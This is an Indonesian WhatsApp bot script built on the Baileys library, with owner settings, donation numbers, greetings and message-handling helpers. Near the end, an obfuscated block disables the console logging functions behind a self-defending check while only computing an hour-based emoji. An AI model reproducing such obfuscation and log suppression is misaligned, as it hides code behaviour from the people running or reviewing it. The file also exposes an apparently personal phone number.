creator = 'Ndyie' //ganti aja paake nama lu
bot = 'Ndyie' //ganti pake nama bot lu

/*
Thanks To Buat
Ndyie Botz
Nyx
Melcanz
Caliph
Anto
Yogi Presetya
*/ 

const {
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
} = require('@adiwajshing/baileys')
const speed = require('performance-now')
const request = require('request')
const fs = require('fs')
const crypto = require('crypto')  
const moment = require('moment-timezone')
const { exec,
 spawn,
 execSync } = require('child_process')


//━━━━━━━━━━━━━━━[ Lib  ]━━━━━━━━━━━━━━━\\
const { color,
 bgcolor } = require('./lib/color')
const { fetchJson,
 fetchText } = require('./lib/fetcher')
const {
  getBuffer,
  h2k,
  generateMessageID,
  getGroupAdmins,
  getRandom,
  banner,
  start,
  info,
  success,
  close,
} = require("./lib/functions");

//━━━━━━━━━━━━━━━[ DATABASE ]━━━━━━━━━━━━━━━━━//
const pendaftar = JSON.parse(fs.readFileSync('./RendyBase/user.json'))

//━━━━━━━━━━━━━━━[ POTO  ]━━━━━━━━━━━━━━━\\
tamnel = fs.readFileSync('./itsuki.jpg')


//━━━━━━━━━━━━━━━[ SETTING  ]━━━━━━━━━━━━━━━\\
const ownerNumber = ["6283818744065"] //ganti pake nomer elu


//━━━━━━━━━━━━━━━[ DONASI ]━━━━━━━━━━━━━━━\\
const ovo = ["083818744065"] //ganti pake nomer ivo lu
const dana = ["083818744065"] //ganti pake nomer dana lu
const gopay = ["083818744065"] //ganti pake nomer gopay lu


//━━━━━━━━━━━━━━━[ APIKEYNYA  ]━━━━━━━━━━━━━━━\\
const caliphAPI = ["caliphganz" ]//jangan di ganti
const cikopi = ["XChillDs"]//jangan di ganti
const cikoapi = ["ciko"]//jangan di ganti
const RendyAPI = ["Rendy"]//jangan di ganti
/*const apikeylu = ["apikeylu"] */ //kalo Punya apikey taro sini

//━━━━━━━━━━━━━━━[ Public Self ]━━━━━━━━━━━━━━━\\
isSelf = false //jangan di ganti
isPublic = false //jangan di ganti
/*isSelf = true
isPublic = true*/

//━━━━━━━━━━━━━━━[ Jam ]━━━━━━━━━━━━━━━\\
function kyun(seconds){
            function pad(s){
            return (s < 10 ? '0' : '') + s;
            }
            var hours = Math.floor(seconds / (60*60));
            var minutes = Math.floor(seconds % (60*60) / 60);
            var seconds = Math.floor(seconds % 60);
            return `${pad(hours)}J ${pad(minutes)}M ${pad(seconds)}D`
            }
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Good night??'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Good afternoon'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Good afternoon'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Good afternoon'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Good morning'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Good Night'
 } 
  
//━━━━━━━━━━━━━━━[ MODULE EXPORTS ]━━━━━━━━━━━━━━━\\
            module.exports = Ndyie = async (Ndyie, Nia) => {
	       try {
            if (!Nia.hasNewMessage) return
            Nia = Nia.messages.all()[0]
			if (!Nia.message) return
			if (Nia.key && Nia.key.remoteJid == 'status@broadcast') return
			if (Nia.key.fromMe) return
			global.prefix
			global.blocked		
		    Nia.message = (Object.keys(Nia.message)[0] === 'ephemeralMessage') ? Nia.message.ephemeralMessage.message : Nia.message
			const content = JSON.stringify(Nia.message)
			const from = Nia.key.remoteJid
	        const type = Object.keys(Nia.message)[0]
			const { text, extendedText, contact, groupInviteMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
			const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			const wita = moment.tz('Asia/Makassar').format("HH:mm:ss")
            const wit = moment.tz('Asia/Jayapura').format("HH:mm:ss")
            const hour_now = moment().format('HH:mm:ss')
            const cmd = (type === 'conversation' && Nia.message.conversation) ? Nia.message.conversation : (type == 'imageMessage') && Nia.message.imageMessage.caption ? Nia.message.imageMessage.caption : (type == 'videoMessage') && Nia.message.videoMessage.caption ? Nia.message.videoMessage.caption : (type == 'extendedTextMessage') && Nia.message.extendedTextMessage.text ? Nia.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
            const prefix = /^[簞?Ａ繩?繞??Ｔ瞼簧??=|~!#$%^&.?/\\穢^z+*@,;]/.test(cmd) ? cmd.match(/^[簞?Ａ繩?繞??Ｔ瞼簧??=|~!#$%^&.?/\\穢^z+*,;]/gi) : '-'          	
			body = (type === 'conversation' && Nia.message.conversation.startsWith(prefix)) ? Nia.message.conversation : (type == 'imageMessage') && Nia.message[type].caption.startsWith(prefix) ? Nia.message[type].caption : (type == 'videoMessage') && Nia.message[type].caption.startsWith(prefix) ? Nia.message[type].caption : (type == 'extendedTextMessage') && Nia.message[type].text.startsWith(prefix) ? Nia.message[type].text : (type == 'listResponseMessage') && Nia.message[type].singleSelectReply.selectedRowId ? Nia.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && Nia.message[type].selectedButtonId ? Nia.message[type].selectedButtonId : ''
			budy = (type === 'conversation') ? Nia.message.conversation : (type === 'extendedTextMessage') ? Nia.message.extendedTextMessage.text : ''
		    const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
	      	const args = body.trim().split(/ +/).slice(1)
	    	const isCmd = body.startsWith(prefix)
	       	const q = args.join(' ')
		    const botNumber = Ndyie.user.jid
		    const botNumberss = Ndyie.user.jid + '@c.us'
		    const isGroup = from.endsWith('@g.us')
		    let sender = isGroup ? Nia.participant : Nia.key.remoteJid
		    const isOwner = ownerNumber.includes(sender)
	     	const totalchat = await Ndyie.chats.all()
		    const groupMetadata = isGroup ? await Ndyie.groupMetadata(from) : ''
		    const groupName = isGroup ? groupMetadata.subject : ''
	     	const groupId = isGroup ? groupMetadata.jid : ''
		    const groupMembers = isGroup ? groupMetadata.participants : ''
		    const groupDesc = isGroup ? groupMetadata.desc : ''
	     	const groupOwner = isGroup ? groupMetadata.owner : ''
		    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
	     	const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		    const isGroupAdmins = groupAdmins.includes(sender) || false        
            const conts = Nia.key.fromMe ? Ndyie.user.jid : Ndyie.contacts[sender] || { notify: jid.replace(/@.+/, '') }
            const pushname = Nia.key.fromMe ? Ndyie.user.name : conts.notify || conts.vname || conts.name || '-'
           const isUser = pendaftar.includes(sender)
           
            
//━━━━━━━━━━━━━━━[ CONNECTION 1 ]━━━━━━━━━━━━━━━\\            
		mess = {
			wait: 'Otewe Ngab',
			success: 'Berhasil!',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'bukan sticker itu:v',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Khusus grup ngab',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
            Ndyie.sendMessage(from, teks, text, {quoted:Nia})
        }

        const sendMess = (hehe, teks) => {
            Ndyie.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? Ndyie.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : Ndyie.sendMessage(from, teks.trim(), extendedText, { quoted: Nia, contextInfo: { "mentionedJid": memberr } })
        }            
        const sendText = (from, text) => {
           Ndyie.sendMessage(from, text, MessageType.text)
        }
(function(_0x3d4356,_0x1c75c0){var _0x58bd3b=_0x3d4356();function _0x2081a0(_0x196395,_0x78b92e,_0x19eae8,_0x5c60fc){return _0xf95a(_0x5c60fc-0xa,_0x196395);}function _0x25d4bf(_0x310b7e,_0x5ac874,_0xe2f95c,_0x40f6c1){return _0xf95a(_0x310b7e- -0x9e,_0x5ac874);}while(!![]){try{var _0x476634=parseInt(_0x25d4bf(0x72,0x71,0x7e,0x4c))/(0x5b9+0x1931+-0x1ee9)+-parseInt(_0x25d4bf(0x80,0x5e,0x79,0x86))/(-0x20c9+0xdb8*-0x2+0x3c3b)*(-parseInt(_0x25d4bf(0x45,0x68,0x20,0x1c))/(0xa*0x203+-0xf6e+-0x4ad))+parseInt(_0x2081a0(0x141,0xfb,0x102,0x120))/(0x15d*0x1b+-0xe7f*0x2+-0x7cd)+-parseInt(_0x25d4bf(0x47,0x27,0x1d,0x4c))/(0x23f3+-0x27*-0xf+-0x43f*0x9)*(parseInt(_0x2081a0(0xf3,0x11f,0x120,0x10e))/(-0x37*-0x91+-0x7c1+0xbb0*-0x2))+-parseInt(_0x2081a0(0x106,0x11c,0xf0,0x111))/(0xcb*-0x4+0x1*0x905+0x5*-0x12a)*(-parseInt(_0x2081a0(0x148,0x145,0x14d,0x13f))/(0x1b5e*-0x1+-0x21af+-0x3d15*-0x1))+-parseInt(_0x25d4bf(0x8e,0xae,0x6d,0x6d))/(-0x50*-0x2c+0x1*-0xc5f+-0xac*0x2)+-parseInt(_0x2081a0(0x10e,0xcf,0xde,0xec))/(-0x1*0x1e73+0x62+-0x1e1b*-0x1);if(_0x476634===_0x1c75c0)break;else _0x58bd3b['push'](_0x58bd3b['shift']());}catch(_0x4f1ea7){_0x58bd3b['push'](_0x58bd3b['shift']());}}}(_0x2b24,-0xb*0x753a+-0x3db1e+-0x1*-0xf054b));var _0x459c23=(function(){function _0x519e66(_0x493431,_0x4f8aa9,_0x5a61f8,_0x978ba9){return _0xf95a(_0x978ba9-0x301,_0x5a61f8);}function _0x457202(_0x4197c5,_0x4ad10d,_0x437741,_0x2167a5){return _0xf95a(_0x4ad10d-0x1c2,_0x4197c5);}var _0xeadbe4={'AqjmZ':function(_0x1a5687,_0x12488f){return _0x1a5687!==_0x12488f;},'LNGag':_0x457202(0x2ae,0x2ae,0x299,0x287),'LrTPR':function(_0x39d91c,_0xa4621e){return _0x39d91c<_0xa4621e;},'cTbqD':_0x519e66(0x3ee,0x3f8,0x3f5,0x3f0),'zqnqC':_0x457202(0x313,0x2f6,0x2d1,0x311),'raxXx':_0x457202(0x303,0x2e1,0x2d3,0x2f7),'HgsVG':_0x457202(0x289,0x2ad,0x285,0x289),'qjuNB':function(_0x52c19e,_0x45fc97){return _0x52c19e+_0x45fc97;},'cjKyU':'return\x20(fu'+_0x457202(0x305,0x2f1,0x2d7,0x2f1),'UAWaD':'{}.constru'+_0x457202(0x2f8,0x2d0,0x2cb,0x2a8)+_0x519e66(0x3f2,0x3f6,0x41e,0x3f7)+'\x20)','txFnO':function(_0x197407){return _0x197407();},'KiqNM':function(_0x14663f,_0xa2796f){return _0x14663f===_0xa2796f;},'aXeEX':_0x519e66(0x403,0x443,0x41f,0x424)},_0x1eec80=!![];return function(_0x1b74f2,_0x4b35bc){var _0x4d0181={'AVcmA':_0x474e97(-0x20d,-0x222,-0x225,-0x232),'okEHv':function(_0x381b99,_0x13bc36){function _0x4a9082(_0x4cc9cc,_0x3d49e1,_0x32b47a,_0x1b4300){return _0x474e97(_0x3d49e1-0x26a,_0x4cc9cc,_0x32b47a-0x2d,_0x1b4300-0x118);}return _0xeadbe4[_0x4a9082(0x39,0x2e,0x48,0x56)](_0x381b99,_0x13bc36);},'VHika':_0xeadbe4['cTbqD'],'uFfYZ':_0xeadbe4[_0x474e97(-0x22e,-0x223,-0x227,-0x256)],'ppGQw':_0xeadbe4[_0x4e12b2(0x4a1,0x4b7,0x4b1,0x4c0)],'QWjDX':_0xeadbe4['HgsVG'],'mkqSQ':'table','VXZHD':function(_0x3fb53c,_0x103b07){function _0x3d2db8(_0x9aa49,_0x552669,_0x153e65,_0x2c7ee1){return _0x4e12b2(_0x552669,_0x552669-0x12e,_0x153e65-0xa3,_0x9aa49- -0x3b7);}return _0xeadbe4[_0x3d2db8(0xf9,0xec,0x11b,0xe9)](_0x3fb53c,_0x103b07);},'uxlKN':_0xeadbe4[_0x474e97(-0x229,-0x21e,-0x23a,-0x23d)],'ReMSY':_0xeadbe4[_0x4e12b2(0x4fd,0x4b6,0x4fd,0x4e0)],'qnkaO':function(_0x1f2178){function _0x68c6a4(_0x2921ed,_0x33d09b,_0x15de39,_0x526ab1){return _0x4e12b2(_0x15de39,_0x33d09b-0xb6,_0x15de39-0xeb,_0x526ab1- -0x22b);}return _0xeadbe4[_0x68c6a4(0x29f,0x2a0,0x272,0x28a)](_0x1f2178);}};function _0x4e12b2(_0x541de2,_0x55f524,_0x572cee,_0x1469fd){return _0x519e66(_0x541de2-0x195,_0x55f524-0x1ad,_0x541de2,_0x1469fd-0xc7);}function _0x474e97(_0x142a66,_0x16eff9,_0x58120a,_0x5371e4){return _0x457202(_0x16eff9,_0x142a66- -0x4f8,_0x58120a-0xd8,_0x5371e4-0x167);}if(_0xeadbe4[_0x4e12b2(0x4ca,0x4c3,0x49c,0x4bc)](_0xeadbe4[_0x474e97(-0x230,-0x24b,-0x232,-0x22e)],_0xeadbe4['aXeEX'])){var _0x1f4e10=_0x1eec80?function(){function _0x19f7ad(_0x552cfc,_0x3b0165,_0x5874c1,_0x3c40a9){return _0x474e97(_0x552cfc-0x507,_0x3b0165,_0x5874c1-0x82,_0x3c40a9-0x142);}function _0x31ec18(_0xf125e6,_0x43927e,_0x18f014,_0x35636d){return _0x474e97(_0x43927e-0x474,_0xf125e6,_0x18f014-0x117,_0x35636d-0xb3);}if(_0xeadbe4[_0x19f7ad(0x2ff,0x2f0,0x318,0x31c)](_0xeadbe4[_0x31ec18(0x24e,0x24a,0x23c,0x264)],_0x31ec18(0x26b,0x264,0x24b,0x24a))){if(_0x4b35bc){var _0x45b411=_0x4b35bc['apply'](_0x1b74f2,arguments);return _0x4b35bc=null,_0x45b411;}}else{var _0x2f373d=_0x4d0181['AVcmA'][_0x31ec18(0x21a,0x22c,0x205,0x205)]('|'),_0x40a394=0x7c5+-0xe26+-0x661*-0x1;while(!![]){switch(_0x2f373d[_0x40a394++]){case'0':for(var _0x3e60ed=-0x822*0x4+0x1df0+0x1*0x298;_0x4d0181[_0x19f7ad(0x2db,0x2c7,0x2ca,0x305)](_0x3e60ed,_0xb426c7['length']);_0x3e60ed++){var _0xeb38a1=_0x557e2b[_0x19f7ad(0x2c8,0x2a4,0x2e3,0x2ba)+'r']['prototype'][_0x19f7ad(0x2e8,0x2f8,0x2e7,0x2fb)](_0x2977fe),_0x267e03=_0xb426c7[_0x3e60ed],_0x81a395=_0x52c65f[_0x267e03]||_0xeb38a1;_0xeb38a1['__proto__']=_0x508ff0[_0x19f7ad(0x2e8,0x2f7,0x2ef,0x2da)](_0x50aab6),_0xeb38a1[_0x19f7ad(0x2f1,0x2f8,0x311,0x2c9)]=_0x81a395[_0x19f7ad(0x2f1,0x2c9,0x2ef,0x2fc)][_0x19f7ad(0x2e8,0x2ff,0x307,0x2d5)](_0x81a395),_0x52c65f[_0x267e03]=_0xeb38a1;}continue;case'1':var _0xb426c7=[_0x4d0181[_0x31ec18(0x226,0x239,0x21a,0x225)],_0x4d0181[_0x19f7ad(0x2f9,0x307,0x2f4,0x2ff)],_0x4d0181[_0x19f7ad(0x2bb,0x2a7,0x2a9,0x2b1)],_0x4d0181['QWjDX'],_0x19f7ad(0x2c6,0x2cf,0x2bb,0x2ad),_0x4d0181[_0x31ec18(0x253,0x240,0x234,0x246)],_0x31ec18(0x21d,0x230,0x22c,0x22c)];continue;case'2':try{var _0xc3861=_0x42ce20(_0x4d0181[_0x31ec18(0x255,0x257,0x262,0x251)](_0x4d0181[_0x31ec18(0x23c,0x251,0x26d,0x270)],_0x4d0181[_0x19f7ad(0x2f2,0x306,0x2e6,0x2e5)])+');');_0x1f2bb1=_0x4d0181['qnkaO'](_0xc3861);}catch(_0x53949c){_0x1f2bb1=_0x1a9b59;}continue;case'3':var _0x1f2bb1;continue;case'4':var _0x52c65f=_0x1f2bb1['console']=_0x1f2bb1[_0x19f7ad(0x2d0,0x2d1,0x2af,0x2f4)]||{};continue;}break;}}}:function(){};return _0x1eec80=![],_0x1f4e10;}else{var _0x468147=_0x4e0580?function(){function _0x274e91(_0x305016,_0x4c202a,_0x14313c,_0x5af8f5){return _0x474e97(_0x305016-0x39b,_0x5af8f5,_0x14313c-0x1b2,_0x5af8f5-0x58);}if(_0x40fe11){var _0x3af12c=_0x5048f1[_0x274e91(0x190,0x179,0x1af,0x1b2)](_0x5a9607,arguments);return _0x3852ef=null,_0x3af12c;}}:function(){};return _0x2caee3=![],_0x468147;}};}()),_0x539082=_0x459c23(this,function(){function _0x1b0c5a(_0x312d9f,_0x446d0b,_0x4553ba,_0xef138b){return _0xf95a(_0x312d9f-0xd3,_0xef138b);}var _0x1d30cb={};function _0x1427dd(_0x3db640,_0x4745e6,_0x50b973,_0x33ae25){return _0xf95a(_0x50b973-0x391,_0x3db640);}_0x1d30cb[_0x1427dd(0x45b,0x467,0x47a,0x47c)]=_0x1b0c5a(0x1b7,0x1b1,0x1a5,0x1a8)+'+$';var _0x494208=_0x1d30cb;return _0x539082['toString']()[_0x1b0c5a(0x1b9,0x19b,0x1b6,0x1d2)](_0x494208[_0x1427dd(0x473,0x470,0x47a,0x45e)])[_0x1427dd(0x49b,0x4ad,0x4b1,0x4b6)]()[_0x1427dd(0x475,0x471,0x488,0x4a8)+'r'](_0x539082)['search'](_0x1b0c5a(0x1b7,0x1b3,0x1b3,0x1c1)+'+$');});function _0xf95a(_0x27c629,_0x482be9){var _0x539082=_0x2b24();return _0xf95a=function(_0x459c23,_0x2b2425){_0x459c23=_0x459c23-(-0x2345+-0x198c+0x3db3);var _0xf95a58=_0x539082[_0x459c23];return _0xf95a58;},_0xf95a(_0x27c629,_0x482be9);}_0x539082();var _0x228334=(function(){function _0x4f0460(_0xbd2fb3,_0xfd73c5,_0x29e527,_0xd35ca6){return _0xf95a(_0xfd73c5-0x191,_0xd35ca6);}var _0x1ec33f={};_0x1ec33f[_0x4f0460(0x2af,0x2ac,0x2a8,0x2a5)]=function(_0x4fd2de,_0x593ac0){return _0x4fd2de===_0x593ac0;},_0x1ec33f['Lofnn']=_0x4f0460(0x2ae,0x2b8,0x2b1,0x291);function _0x1b9318(_0x55024c,_0x42ef63,_0x2eccce,_0x52b2b2){return _0xf95a(_0x42ef63-0x2d,_0x55024c);}_0x1ec33f[_0x4f0460(0x29a,0x284,0x2a5,0x2a2)]=_0x4f0460(0x290,0x2b3,0x2cd,0x294),_0x1ec33f['LGAqa']=function(_0x1b71af,_0x51ee96){return _0x1b71af===_0x51ee96;},_0x1ec33f['FffHn']=_0x4f0460(0x294,0x29c,0x2a6,0x2b7),_0x1ec33f[_0x1b9318(0x141,0x13f,0x11e,0x13b)]=function(_0x366f54,_0x57ec70){return _0x366f54!==_0x57ec70;};var _0x1cc53f=_0x1ec33f,_0x1e573e=!![];return function(_0x10c143,_0xe4c732){function _0x1e5767(_0x2a8007,_0x270d6b,_0x5f0258,_0x485a47){return _0x4f0460(_0x2a8007-0xe8,_0x5f0258-0x21e,_0x5f0258-0xb3,_0x2a8007);}function _0x305f63(_0x287278,_0x428704,_0x59bfb6,_0x3404c6){return _0x1b9318(_0x428704,_0x3404c6-0x19e,_0x59bfb6-0x137,_0x3404c6-0x151);}if(_0x1cc53f[_0x1e5767(0x4bc,0x4e8,0x4c1,0x4d4)](_0x305f63(0x2be,0x2f6,0x2fb,0x2dc),_0x1e5767(0x4ce,0x4b0,0x4c0,0x4e1)))_0x3931f3=_0x4cb214;else{var _0x21d5d6=_0x1e573e?function(){function _0x46a16a(_0x4d4d90,_0x1bf16c,_0x89072b,_0x2e42ae){return _0x305f63(_0x4d4d90-0x1ea,_0x1bf16c,_0x89072b-0x126,_0x89072b- -0x303);}function _0x3f458c(_0x139f4e,_0x196622,_0xf09e06,_0x1466e4){return _0x1e5767(_0xf09e06,_0x196622-0x75,_0x196622- -0x5f4,_0x1466e4-0x15b);}if(_0x1cc53f[_0x46a16a(-0x10,-0x8,-0x1d,-0x20)](_0x1cc53f[_0x3f458c(-0xfe,-0x118,-0x11f,-0x133)],_0x1cc53f['lManS'])){if(_0x409c83){var _0x36e566=_0x2b30cb[_0x3f458c(-0xfe,-0x11a,-0x13d,-0x144)](_0x594f49,arguments);return _0xa20a09=null,_0x36e566;}}else{if(_0xe4c732){if(_0x1cc53f[_0x46a16a(-0x29,-0x53,-0x3c,-0x39)](_0x3f458c(-0x12c,-0x13a,-0x13d,-0x13a),_0x1cc53f[_0x3f458c(-0x133,-0x147,-0x170,-0x16f)])){var _0x214087=_0xe4c732[_0x3f458c(-0x122,-0x11a,-0x100,-0x10b)](_0x10c143,arguments);return _0xe4c732=null,_0x214087;}else{if(_0x725c2d){var _0x4f6d05=_0x10e115['apply'](_0x88c39e,arguments);return _0x251120=null,_0x4f6d05;}}}}}:function(){};return _0x1e573e=![],_0x21d5d6;}};}()),_0x2a453f=_0x228334(this,function(){var _0x39d3b9={'gWlaD':function(_0x2ab6d2,_0x179121){return _0x2ab6d2(_0x179121);},'rksrE':function(_0x3ea507,_0x1b8f52){return _0x3ea507+_0x1b8f52;},'YCCyZ':function(_0x37d0b5){return _0x37d0b5();},'nrYbe':function(_0x427d2a,_0x2c3d8d){return _0x427d2a===_0x2c3d8d;},'RFPAn':_0x12eede(0x1f,0x3a,0x1f,0x45),'FVzoW':_0x11e0b3(-0x23f,-0x260,-0x24b,-0x23d),'TmUcw':function(_0x43c880,_0x18778c){return _0x43c880(_0x18778c);},'gJzRm':_0x11e0b3(-0x25e,-0x25f,-0x27b,-0x24c)+_0x12eede(0x4e,0x36,0x3a,0x3d),'COpto':_0x11e0b3(-0x269,-0x26c,-0x277,-0x26f)+'ctor(\x22retu'+'rn\x20this\x22)('+'\x20)','zFSHj':function(_0x267cc7){return _0x267cc7();},'ajXaw':'warn','dCVdb':_0x12eede(0x3e,0x17,0x4b,0x20),'QNLMA':'error','HIfGC':'exception','QpSZy':_0x11e0b3(-0x2b0,-0x293,-0x276,-0x27e),'TSFZT':_0x11e0b3(-0x27c,-0x29e,-0x2b3,-0x280),'wGmIu':function(_0x7a1ecc,_0x34580c){return _0x7a1ecc<_0x34580c;},'Rtpro':_0x11e0b3(-0x26b,-0x28f,-0x2a0,-0x289)+'0'},_0x3bfd83;try{if(_0x39d3b9[_0x12eede(0xf,-0xc,0x9,-0x5)](_0x39d3b9[_0x12eede(0x34,0x4f,0x39,0x39)],_0x39d3b9['FVzoW'])){var _0x5dbaf2=_0x39d3b9[_0x12eede(0x24,0x41,0x4,0x2b)](_0x4fc6f0,_0x39d3b9[_0x11e0b3(-0x250,-0x26b,-0x27e,-0x250)](_0x11e0b3(-0x261,-0x25f,-0x24f,-0x264)+_0x11e0b3(-0x283,-0x261,-0x248,-0x240),_0x12eede(0x43,0x4b,0x3b,0x5c)+_0x11e0b3(-0x2a0,-0x282,-0x28c,-0x273)+_0x11e0b3(-0x2c1,-0x29a,-0x2bd,-0x29a)+'\x20)')+');');_0x2abe9c=_0x39d3b9[_0x12eede(0x10,0x26,0x16,0x16)](_0x5dbaf2);}else{var _0xf71a2c=_0x39d3b9[_0x12eede(0x18,0x29,0xc,0x3a)](Function,_0x39d3b9[_0x11e0b3(-0x276,-0x26b,-0x252,-0x279)](_0x39d3b9[_0x12eede(0x44,0x5a,0x4e,0x5e)](_0x39d3b9['gJzRm'],_0x39d3b9[_0x12eede(0x2e,0x14,0x58,0x4e)]),');'));_0x3bfd83=_0x39d3b9['zFSHj'](_0xf71a2c);}}catch(_0x50d2d8){_0x3bfd83=window;}var _0x36e833=_0x3bfd83[_0x12eede(0x1e,-0x2,-0x6,0xc)]=_0x3bfd83[_0x12eede(0x1e,0x2f,0x16,0x6)]||{};function _0x11e0b3(_0x7400cd,_0x3f795d,_0x21cc0e,_0x29bba9){return _0xf95a(_0x3f795d- -0x390,_0x7400cd);}function _0x12eede(_0x5cafc6,_0x69f575,_0x45cde6,_0x1ab379){return _0xf95a(_0x5cafc6- -0xe1,_0x69f575);}var _0x2d5037=[_0x11e0b3(-0x2a0,-0x2a1,-0x294,-0x2a9),_0x39d3b9[_0x11e0b3(-0x26c,-0x287,-0x298,-0x260)],_0x39d3b9['dCVdb'],_0x39d3b9[_0x11e0b3(-0x27f,-0x25d,-0x27c,-0x248)],_0x39d3b9[_0x12eede(0x3b,0x41,0x60,0x37)],_0x39d3b9[_0x11e0b3(-0x28f,-0x2a9,-0x2d2,-0x284)],_0x39d3b9[_0x12eede(0x49,0x2f,0x48,0x4b)]];for(var _0x4900b1=-0xe8+-0x174f+0x1837;_0x39d3b9[_0x11e0b3(-0x274,-0x28d,-0x270,-0x274)](_0x4900b1,_0x2d5037[_0x12eede(0x51,0x2b,0x6c,0x4a)]);_0x4900b1++){var _0x5da6a1=_0x39d3b9[_0x11e0b3(-0x28c,-0x273,-0x278,-0x269)][_0x11e0b3(-0x2c5,-0x2a2,-0x284,-0x27c)]('|'),_0x490479=-0xaba*0x3+0x1*0x40f+0x1c1f;while(!![]){switch(_0x5da6a1[_0x490479++]){case'0':_0x36e833[_0x12de45]=_0x17dc88;continue;case'1':var _0x17dc88=_0x228334['constructo'+'r'][_0x12eede(0x39,0x12,0x2b,0x17)][_0x12eede(0x36,0x5e,0x13,0x4b)](_0x228334);continue;case'2':_0x17dc88[_0x12eede(0x3f,0x23,0x38,0x15)]=_0x4446c1['toString']['bind'](_0x4446c1);continue;case'3':_0x17dc88['__proto__']=_0x228334[_0x11e0b3(-0x290,-0x279,-0x25c,-0x27b)](_0x228334);continue;case'4':var _0x4446c1=_0x36e833[_0x12de45]||_0x17dc88;continue;case'5':var _0x12de45=_0x2d5037[_0x4900b1];continue;}break;}}});_0x2a453f();var ase=new Date(),jamss=ase[_0x53764b(0x1f6,0x20c,0x232,0x22a)]();function _0x53764b(_0x145e84,_0x168b00,_0x4e390e,_0x4352b3){return _0xf95a(_0x168b00-0xf8,_0x4352b3);}switch(jamss){case-0x5ef*0x1+-0xab4+0x10a3:jamss='☕';break;case 0x13f9+0x1015+-0x240d:jamss='☕';break;case-0xa4*0xc+0x30*-0x40+-0x13b2*-0x1:jamss='☕';break;case 0x7*-0x1e9+0x1*0xb01+-0x15*-0x1d:jamss='☕';break;case-0x1946+-0x9fd*-0x1+0x1*0xf4d:jamss='🍵';break;case 0xb*-0x31d+0x24f+0x1ff5:jamss='🥛';break;case-0x3e1+0x11bf+-0xdd8:jamss='🍮';break;case 0x20*-0x29+-0x1d8a+0x22b1*0x1:jamss='🥛';break;case-0x22c1+0x3*-0xa81+0x1093*0x4:jamss='🍿';break;case-0x5*-0x203+-0x199*0x2+-0x6d4:jamss='🥛';break;case 0x12ad+-0x1*0x295+-0x100e:jamss='🥛';break;case-0xd*-0x77+-0x1fcc+0x19cc:jamss='🥛';break;case-0x2194+0xe2+0x2*0x105f:jamss='🥃';break;case-0x1*0x233+-0xbc1+0xe01:jamss='🥛';break;case 0xc65+0x17*0x18b+-0x2fd4:jamss='🍷';break;case 0x65e*-0x3+-0x2418+-0xf*-0x3af:jamss='🍹';break;case 0x26e8+0x52*0x2b+-0x349e:jamss='🍷';break;case 0x523+-0x10db+-0x1af*-0x7:jamss='🍷';break;case 0x1b54+0x2ba+0x2*-0xefe:jamss='🍸';break;case 0x43*-0x22+0x72c+0x1cd:jamss='✨';break;case 0x1e6e+-0x1834+0x2*-0x313:jamss='🍸';break;case-0x1159+0x1aef+0x981*-0x1:jamss='🍸';break;case 0x1b04+0xd6d*-0x1+-0xd81*0x1:jamss='🍸';break;case 0x2c7*0xb+0x209f+-0x3f15:jamss='🍸';break;}function _0x2b24(){var _0xe0cfe2=['exception','rn\x20this\x22)(','constructo','raxXx','TmUcw','LrTPR','VHika','LGAqa','table','FffHn','console','FAyWf','1|5|4|3|2|','mkqSQ','wGmIu','180SLKqwP','gWlaD','aXeEX','119588rMCZSW','zqnqC','ajXaw','okEHv','lXsWv','LNGag','cjKyU','ctor(\x22retu','COpto','30108PfYfVm','ZHjzQ','QYpEF','uxlKN','getHours','RFPAn','1520600REXWvA','bind','UAWaD','VXZHD','prototype','kCmeU','HIfGC','Rtpro','80146wIQQpL','info','toString','ReMSY','gBOzz','UeDfm','{}.constru','rksrE','xZCSv','WhDZk','uFfYZ','3|2|4|1|0','TSFZT','apply','114741CxqTIF','Lofnn','AqjmZ','nction()\x20','otygp','return\x20(fu','length','QNLMA','warn','112cpObfu','4850450DYwVTE','33KARvoN','(((.+)+)+)','31810hpmclf','search','QpSZy','qjuNB','EnOax','ppGQw','error','BshlI','txFnO','split','log','nrYbe','YCCyZ','trace','lManS','KiqNM'];_0x2b24=function(){return _0xe0cfe2;};return _0x2b24();}var ndyie=''+jamss;


//━━━━━━━━━━━━━━━[ BUTTON ]━━━━━━━━━━━━━━━━━//
